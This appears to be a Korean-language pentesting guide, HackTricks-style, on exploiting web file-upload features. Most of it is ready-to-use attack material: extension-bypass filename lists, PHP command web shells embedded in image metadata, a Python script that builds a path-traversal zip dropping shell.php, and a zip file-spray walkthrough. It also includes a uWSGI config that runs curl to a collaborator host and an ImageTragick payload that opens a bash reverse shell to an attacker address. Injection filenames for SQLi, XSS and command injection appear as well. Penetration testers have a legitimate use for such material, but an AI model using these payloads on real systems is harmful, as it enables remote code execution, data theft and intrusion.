# 파일 업로드

{{#include ../../banners/hacktricks-training.md}}

## 파일 업로드 일반 방법론

기타 유용한 확장자:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **PHPv8에서 작업하기**: _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws 웹 서버**: _.yaws_

### 파일 확장자 검사 우회

1. 적용되는 경우, **이전 확장자**를 **확인**합니다. 또한 **대문자**를 사용하여 테스트합니다: _pHp, .pHP5, .PhAr ..._
2. _실행 확장자 앞에 **유효한 확장자 추가** 확인 (이전 확장자도 사용):_
- _file.png.php_
- _file.png.Php5_
3. **특수 문자를 끝에 추가**해 보십시오. Burp를 사용하여 모든 **ascii** 및 **Unicode** 문자를 **브루트포스**할 수 있습니다. (_이전의 **확장자**를 사용하여 더 나은 페이로드를 준비할 수도 있습니다._)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. **서버 측의 확장자 파서를 속여** 보호를 우회해 보십시오. **확장자**를 **두 번** 추가하거나 **쓰레기** 데이터 (**null** 바이트)를 확장자 사이에 추가하는 기술을 사용할 수 있습니다. _이전 확장자를 사용하여 더 나은 페이로드를 준비할 수 있습니다._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. 이전 검사에 **또 다른 확장자 레이어 추가**:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. **유효한 확장자 앞에 exec 확장자 추가**하고 서버가 잘못 구성되기를 기도합니다. (Apache 잘못 구성에서 유용하며, **.php**로 끝나지 않더라도 모든 것이 코드를 실행합니다):
- _예: file.php.png_
7. **Windows**에서 **NTFS 대체 데이터 스트림 (ADS)** 사용. 이 경우, 금지된 확장자 뒤에 콜론 문자 “:”가 삽입되고 허용된 확장자 앞에 삽입됩니다. 결과적으로 **금지된 확장자를 가진 빈 파일**이 서버에 생성됩니다 (예: “file.asax:.jpg”). 이 파일은 나중에 다른 기술을 사용하여 편집할 수 있습니다. “**::$data**” 패턴을 사용하여 비어 있지 않은 파일을 생성할 수도 있습니다. 따라서 이 패턴 뒤에 점 문자를 추가하는 것도 추가 제한을 우회하는 데 유용할 수 있습니다 (예: “file.asp::$data.”)
8. 파일 이름 제한을 **깨뜨려** 보십시오. 유효한 확장자가 잘리게 됩니다. 그리고 악성 PHP가 남게 됩니다. AAA<--SNIP-->AAA.php

```
# 리눅스 최대 255 바이트
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ab3Ab4Ab5Ab6Ab7Ab8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # 여기서 4를 빼고 .png 추가
# 파일을 업로드하고 응답을 확인하여 허용되는 문자의 수를 확인합니다. 예를 들어 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# 페이로드 만들기
AAA<--SNIP 232 A-->AAA.php.png
```

### Content-Type, 매직 넘버, 압축 및 크기 조정 우회

- **Content-Type** 검사를 우회하려면 **Content-Type** **헤더**의 **값**을 다음으로 설정합니다: _image/png_, _text/plain_, application/octet-stream_
1. Content-Type **단어 목록**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- 파일의 시작 부분에 **실제 이미지의 바이트**를 추가하여 **매직 넘버** 검사를 우회합니다 (파일 명령을 혼란스럽게 함). 또는 **메타데이터** 내에 쉘을 삽입합니다:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` 또는 이미지를 통해 **페이로드를 직접 삽입**할 수도 있습니다:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- **압축이 이미지에 추가되는 경우**, 예를 들어 [PHP-GD](https://www.php.net/manual/fr/book.image.php)와 같은 표준 PHP 라이브러리를 사용하는 경우, 이전 기술은 유용하지 않을 수 있습니다. 그러나 **PLTE 청크** [**여기 정의된 기술**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html)을 사용하여 압축을 견딜 수 있는 텍스트를 삽입할 수 있습니다.
- [**코드가 포함된 Github**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- 웹 페이지가 **이미지의 크기를 조정**할 수도 있습니다. 예를 들어 PHP-GD 함수 `imagecopyresized` 또는 `imagecopyresampled`를 사용할 수 있습니다. 그러나 **IDAT 청크** [**여기 정의된 기술**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html)을 사용하여 압축을 견딜 수 있는 텍스트를 삽입할 수 있습니다.
- [**코드가 포함된 Github**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- PHP-GD 함수 `thumbnailImage`를 사용하여 **이미지 크기 조정**을 견딜 수 있는 페이로드를 만드는 또 다른 기술. 그러나 **tEXt 청크** [**여기 정의된 기술**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html)을 사용하여 압축을 견딜 수 있는 텍스트를 삽입할 수 있습니다.
- [**코드가 포함된 Github**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### 확인할 기타 트릭

- 이미 업로드된 파일의 **이름을 바꿀 수 있는 취약점**을 찾습니다 (확장자를 변경).
- **로컬 파일 포함** 취약점을 찾아 백도어를 실행합니다.
- **정보 유출 가능성**:
1. **동일한 파일**을 **여러 번** (그리고 **동시에**) **동일한 이름**으로 업로드합니다.
2. **이미 존재하는** **파일** 또는 **폴더**의 **이름**으로 파일을 업로드합니다.
3. **“.”, “..”, 또는 “…”**를 이름으로 가진 파일을 업로드합니다. 예를 들어, Windows의 Apache에서 애플리케이션이 업로드된 파일을 “/www/uploads/” 디렉토리에 저장하는 경우, “.” 파일 이름은 “/www/” 디렉토리에 “uploads”라는 파일을 생성합니다.
4. **NTFS**에서 쉽게 삭제할 수 없는 파일을 업로드합니다. (Windows) 예: **“…:.jpg”**
5. **Windows**에서 **잘못된 문자**가 포함된 파일을 업로드합니다. (Windows) 예: `|<>*?”`
6. **Windows**에서 **예약된** (**금지된**) **이름**으로 파일을 업로드합니다. 예: CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, LPT9.
- 또한 **실행 파일** (.exe) 또는 **.html** (덜 의심스러운) 파일을 업로드하여 피해자가 우연히 열었을 때 **코드를 실행**하도록 합니다.

### 특수 확장자 트릭

**PHP 서버**에 파일을 업로드하려는 경우, [코드를 실행하기 위한 **.htaccess** 트릭을 확인하십시오](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp#code-execution-via-httaccess).\
**ASP 서버**에 파일을 업로드하려는 경우, [코드를 실행하기 위한 **.config** 트릭을 확인하십시오](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

`.phar` 파일은 Java의 `.jar`와 유사하지만 PHP에 대한 것이며, **PHP 파일처럼 사용**될 수 있습니다 (PHP로 실행하거나 스크립트 내에 포함).

`.inc` 확장자는 때때로 파일을 **가져오는 데만 사용되는** PHP 파일에 사용되므로, 누군가 이 확장자가 **실행되도록 허용했을 수 있습니다**.

## **Jetty RCE**

Jetty 서버에 XML 파일을 업로드할 수 있다면, [**새로운 \*.xml 및 \*.war가 자동으로 처리되기 때문에 RCE를 얻을 수 있습니다**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** 따라서 다음 이미지에서 언급된 대로 XML 파일을 `$JETTY_BASE/webapps/`에 업로드하고 쉘을 기대하십시오!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

이 취약점에 대한 자세한 탐색은 원본 연구를 확인하십시오: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

원격 명령 실행 (RCE) 취약점은 `.ini` 구성 파일을 수정할 수 있는 경우 uWSGI 서버에서 악용될 수 있습니다. uWSGI 구성 파일은 "마법" 변수, 자리 표시자 및 연산자를 포함하기 위해 특정 구문을 활용합니다. 특히, `@(filename)`으로 사용되는 '@' 연산자는 파일의 내용을 포함하도록 설계되었습니다. uWSGI에서 지원되는 다양한 스킴 중 "exec" 스킴은 특히 강력하여 프로세스의 표준 출력에서 데이터를 읽을 수 있습니다. 이 기능은 원격 명령 실행 또는 임의 파일 쓰기/읽기를 위한 악의적인 목적으로 조작될 수 있습니다.
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
페이로드의 실행은 구성 파일의 파싱 중에 발생합니다. 구성이 활성화되고 파싱되기 위해서는 uWSGI 프로세스가 재시작되어야 하며(충돌 후 또는 서비스 거부 공격으로 인해) 파일이 자동으로 다시 로드되도록 설정되어야 합니다. 자동 다시 로드 기능이 활성화된 경우, 변경 사항을 감지하면 지정된 간격으로 파일을 다시 로드합니다.

uWSGI의 구성 파일 파싱의 느슨한 특성을 이해하는 것이 중요합니다. 특히, 논의된 페이로드는 이진 파일(예: 이미지 또는 PDF)에 삽입될 수 있어 잠재적인 악용 범위를 더욱 넓힙니다.

## **wget 파일 업로드/SSRF 트릭**

일부 경우, 서버가 **`wget`**을 사용하여 **파일을 다운로드**하고 **URL**을 **지정**할 수 있는 경우가 있습니다. 이러한 경우, 코드는 다운로드된 파일의 확장자가 화이트리스트에 있는지 확인하여 허용된 파일만 다운로드되도록 보장할 수 있습니다. 그러나 **이 검사를 우회할 수 있습니다.**\
**리눅스**에서 **파일 이름**의 **최대** 길이는 **255**자이지만, **wget**은 파일 이름을 **236**자로 잘라냅니다. **"A"\*232+".php"+".gif"**라는 파일을 **다운로드**할 수 있으며, 이 파일 이름은 **검사**를 **우회**합니다(이 예에서 **".gif"**는 **유효한** 확장자입니다) 그러나 `wget`은 파일 이름을 **"A"\*232+".php"**로 **변경**합니다.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
다른 옵션은 이 검사를 우회하기 위해 **HTTP 서버가 다른 파일로 리디렉션**하도록 만드는 것입니다. 그러면 초기 URL이 검사를 우회하고 wget이 새 이름으로 리디렉션된 파일을 다운로드합니다. 이는 **wget이 `--trust-server-names` 매개변수와 함께 사용되지 않는 한 작동하지 않습니다**. 왜냐하면 **wget은 원래 URL에 표시된 파일 이름으로 리디렉션된 페이지를 다운로드하기 때문입니다**.

## 도구

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass)는 Pentesters와 Bug Hunters가 파일 업로드 메커니즘을 테스트하는 데 도움을 주기 위해 설계된 강력한 도구입니다. 다양한 버그 바운티 기법을 활용하여 취약점을 식별하고 악용하는 과정을 단순화하여 웹 애플리케이션에 대한 철저한 평가를 보장합니다.

## 파일 업로드에서 다른 취약점으로

- **filename**을 `../../../tmp/lol.png`로 설정하고 **경로 탐색**을 시도합니다.
- **filename**을 `sleep(10)-- -.jpg`로 설정하면 **SQL 인젝션**을 달성할 수 있습니다.
- **filename**을 `<svg onload=alert(document.domain)>`로 설정하여 XSS를 달성합니다.
- **filename**을 `; sleep 10;`으로 설정하여 일부 명령 주입을 테스트합니다 (더 많은 [명령 주입 트릭은 여기](../command-injection.md)에서 확인하세요).
- [**XSS** 이미지 (svg) 파일 업로드](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** 파일 **업로드** + **XSS** = [**서비스 워커** 악용](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**SVG 업로드에서 XXE**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**SVG 파일 업로드를 통한 오픈 리디렉션**](../open-redirect.md#open-redirect-uploading-svg-files)
- [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)에서 **다양한 svg 페이로드**를 시도해 보세요.
- [유명한 **ImageTrick** 취약점](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- **웹 서버에 URL에서 이미지를 가져오도록 지시할 수 있다면**, [SSRF](../ssrf-server-side-request-forgery/index.html)를 악용할 수 있습니다. 이 **이미지**가 어떤 **공개** 사이트에 **저장**될 경우, [https://iplogger.org/invisible/](https://iplogger.org/invisible/)의 URL을 지정하여 **모든 방문자의 정보를 훔칠** 수 있습니다.
- [PDF-Adobe 업로드로 **XXE 및 CORS** 우회](pdf-upload-xxe-and-cors-bypass.md)
- XSS를 위한 특별히 제작된 PDF: [다음 페이지는 **PDF 데이터를 주입하여 JS 실행을 얻는 방법**을 제시합니다](../xss-cross-site-scripting/pdf-injection.md). PDF를 업로드할 수 있다면, 주어진 지침에 따라 임의의 JS를 실행할 PDF를 준비할 수 있습니다.
- \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) 콘텐츠를 업로드하여 서버에 **안티바이러스**가 있는지 확인합니다.
- 파일 업로드 시 **크기 제한**이 있는지 확인합니다.

여기 파일 업로드를 통해 달성할 수 있는 10가지 목록이 있습니다 (출처: [여기](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: 웹쉘 / RCE
2. **SVG**: 저장된 XSS / SSRF / XXE
3. **GIF**: 저장된 XSS / SSRF
4. **CSV**: CSV 인젝션
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS**: HTML 인젝션 / XSS / 오픈 리디렉션
8. **PNG / JPEG**: 픽셀 플러드 공격 (DoS)
9. **ZIP**: LFI를 통한 RCE / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp 확장

{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## 매직 헤더 바이트

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
- **JPG**: `"\xff\xd8\xff"`

다른 파일 형식에 대한 정보는 [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)를 참조하세요.

### Zip/Tar 파일 자동 압축 해제 업로드

서버 내에서 압축 해제될 ZIP 파일을 업로드할 수 있다면, 두 가지 작업을 수행할 수 있습니다:

#### 심볼릭 링크

다른 파일에 대한 소프트 링크를 포함하는 링크를 업로드한 다음, 압축 해제된 파일에 접근하여 링크된 파일에 접근할 수 있습니다:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### 다른 폴더에 압축 해제

압축 해제 중 디렉토리에서 파일이 예기치 않게 생성되는 것은 중요한 문제입니다. 이 설정이 악성 파일 업로드를 통한 OS 수준의 명령 실행을 방지할 것이라는 초기 가정에도 불구하고, ZIP 아카이브 형식의 계층적 압축 지원 및 디렉토리 탐색 기능이 악용될 수 있습니다. 이를 통해 공격자는 제한을 우회하고 대상 애플리케이션의 압축 해제 기능을 조작하여 안전한 업로드 디렉토리를 탈출할 수 있습니다.

이러한 파일을 생성하기 위한 자동화된 익스플로잇은 [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc)에서 사용할 수 있습니다. 유틸리티는 다음과 같이 사용할 수 있습니다:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
추가적으로, **evilarc와 함께하는 symlink 트릭**은 옵션입니다. 목표가 `/flag.txt`와 같은 파일을 타겟으로 하는 경우, 해당 파일에 대한 symlink를 시스템에 생성해야 합니다. 이는 evilarc가 작동 중 오류를 겪지 않도록 보장합니다.

아래는 악성 zip 파일을 생성하는 데 사용되는 Python 코드의 예입니다:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**압축을 이용한 파일 스프레이**

자세한 내용은 **원본 게시물을 확인하세요**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **PHP 셸 생성**: PHP 코드는 `$_REQUEST` 변수를 통해 전달된 명령을 실행하도록 작성됩니다.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **파일 스프레이 및 압축 파일 생성**: 여러 파일이 생성되고 이 파일들을 포함하는 zip 아카이브가 조립됩니다.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Hex 편집기 또는 vi로 수정**: zip 내부의 파일 이름을 vi 또는 hex 편집기를 사용하여 "xxA"를 "../"로 변경하여 디렉토리를 탐색합니다.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

이 콘텐츠를 이미지 확장자로 업로드하여 취약점을 악용하세요 **(ImageMagick , 7.0.1-1)** (출처: [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## PNG에 PHP 셸 삽입

PNG 파일의 IDAT 청크에 PHP 셸을 삽입하면 특정 이미지 처리 작업을 효과적으로 우회할 수 있습니다. PHP-GD의 `imagecopyresized` 및 `imagecopyresampled` 함수는 각각 이미지를 크기 조정하고 재샘플링하는 데 일반적으로 사용되므로 이 맥락에서 특히 관련이 있습니다. 삽입된 PHP 셸이 이러한 작업의 영향을 받지 않는 능력은 특정 사용 사례에 있어 중요한 장점입니다.

이 기술에 대한 자세한 탐구, 방법론 및 잠재적 응용 프로그램은 다음 기사에서 제공됩니다: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). 이 자료는 프로세스와 그 의미에 대한 포괄적인 이해를 제공합니다.

자세한 정보는: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## 폴리글롯 파일

폴리글롯 파일은 사이버 보안에서 독특한 도구로 작용하며, 여러 파일 형식에서 동시에 유효하게 존재할 수 있는 카멜레온과 같습니다. 흥미로운 예로는 GIF와 RAR 아카이브로 기능하는 하이브리드인 [GIFAR](https://en.wikipedia.org/wiki/Gifar)가 있습니다. 이러한 파일은 이 조합에 국한되지 않으며, GIF와 JS 또는 PPT와 JS와 같은 조합도 가능합니다.

폴리글롯 파일의 핵심 유용성은 파일 유형에 따라 파일을 검사하는 보안 조치를 우회할 수 있는 능력에 있습니다. 다양한 애플리케이션에서 일반적인 관행은 JPEG, GIF 또는 DOC와 같은 특정 파일 유형만 업로드를 허용하여 잠재적으로 해로운 형식(예: JS, PHP 또는 Phar 파일)으로 인한 위험을 완화하는 것입니다. 그러나 폴리글롯은 여러 파일 유형의 구조적 기준을 준수함으로써 이러한 제한을 은밀하게 우회할 수 있습니다.

그들의 적응성에도 불구하고, 폴리글롯은 한계에 직면합니다. 예를 들어, 폴리글롯이 PHAR 파일(PHp ARchive)과 JPEG를 동시에 포함할 수 있지만, 업로드의 성공 여부는 플랫폼의 파일 확장자 정책에 달려 있을 수 있습니다. 시스템이 허용되는 확장자에 대해 엄격하다면, 폴리글롯의 단순한 구조적 이중성만으로는 업로드를 보장할 수 없습니다.

자세한 정보는: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

## 참고 문헌

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

{{#include ../../banners/hacktricks-training.md}}
